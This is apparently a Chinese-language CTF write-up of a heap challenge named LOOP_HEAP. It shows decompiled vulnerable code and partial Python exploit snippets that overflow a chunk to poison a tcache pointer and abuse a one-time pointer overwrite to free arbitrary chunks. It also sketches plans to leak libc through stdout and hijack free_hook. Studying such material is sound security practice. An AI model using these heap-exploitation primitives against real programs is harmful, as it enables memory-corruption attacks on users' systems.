# LOOP_HEAP

连续分配和释放chunk，可以写入超界数据，保护全开。

![KQxMxO](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/KQxMxO.png)

**审计**

第一次输入分配size大小的chunk，第二次输入写入数据的长度size（可以超过chunk大小），第三次输入数据data。程序会不停循环，libc版本是2.27，所以包含tcachebins。

漏洞是在写chunk的时候能够堆溢出，覆盖下一个chunk。

特殊的是，当输入的size值为1234时，使我们能够修改buf指针。(不确定)

```c
  size_4 = 1;
  v8 = 20;
  sub_A3A();
  while ( 1 )
  {
    v3 = v8--;
    if ( v3 <= 0 )
      break;
    printf("malloc size: ");
    size = sub_AC9();
    if ( size == 1234 && size_4 ) //是我们能够修改buf指针
    {
      size_4 = 0;
      read(0, &buf, 8uLL);
      *buf = 0LL;
      size = *buf;
    }
    if ( size > 0x80 )
      exit(1);
    buf = malloc(size);
    if ( !buf )
      exit(1);
    if ( ::buf )
      free(::buf);
    ::buf = buf;
    printf("read size: ");
    sizea = sub_AC9();
    if ( sizea > 0x80 )
      exit(1);
    printf("data: ");
    if ( read(0, ::buf, sizea) <= 0 )
      exit(1);
  }
  return 0LL;
}
```

Demo

验证代码能够修改tcachebins指向0x41414141

![78xN00](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/78xN00.png)

```python
r  = lambda data    :p.recv(data)
ru = lambda data    :p.recvuntil(data)
s  = lambda data    :p.send(data)
sl = lambda data    :p.sendline(data)

def mrd(size1,size2,data):
    ru("malloc size: ")
    s(str(size1))
    ru("read size: ")
    s(str(size2))
    ru("data:")
    s(data)

mrd(0x10,0x10,"A"*0x10)#malloc chunk_a
mrd(0x20,0x20,"B"*0x10)#malloc chunk_b && free chunk_a
mrd(0x10,0x30,"C"*0x18+p64(0x21)+p64(0x41414141))#malloc chunk_c && free_chunk_b

#mrd(0x20,0x30,"123")
#mrd(0x20,0x30,"123") #malloc_chunk in 0x41414141
```

这道题的malloc_hook和free_hook居然在bss段，第一次见到这样的题目。。。这样的话只要能泄露程序地址就能写malloc_hook了，但是这并没有用，one_gadget地址还是不确定，如果能覆盖free_hook为system那还有可能。

![4JxJag](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/4JxJag.png)

考虑思路1：通过patril write，修改tcache chunk的fd，来凑stdout的位置，然后覆盖IO_FILE来泄露地址。思路大概和这篇[文章](https://bbs.pediy.com/thread-248053-1.htm)类似

但是因为申请限制，只能申请0x80以下的chunk，所以使用不了unsortbin

仔细看看tchche机制，发现只要free7个chunk就能将tcache填满。不过实验之后，发现得同一个链上free7个，但是题目限制，导致无法实现。

![tduZDZ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/tduZDZ.png)

再审题，感觉这个 **if** 可能是个关键,buf和::buf并不是同一块内存地址。buf在栈中，::buf则是在程序的bss段中。通过输入size=1234能够修改buf的低地址，但是**仅一次**。

```c
    if ( size == 1234 && size_4 )
    {
      size_4 = 0;
      read(0, &buf, 8uLL);  #修改buf的低地址
      *buf = 0LL;
      size = *buf;
    }
```

修改buf的值，可以用来释放任意堆块。

```
mrd(0x10,0x10,"A"*0x10) #malloc_chunk

ru("malloc size: ")
s(str(1234))
s("\x80")
ru("read size: ")
s(str(0x10))
ru("data:")
s("aaaa")
```



如何产生一个unsortbin是一件麻烦的事情，可以尝试伪造一个0x500的堆，释放就直接进入unsortbin中了。



# Appendix

内存中读取stdout

![image-20200505225757512](/Users/migraine/Library/Application Support/typora-user-images/image-20200505225757512.png)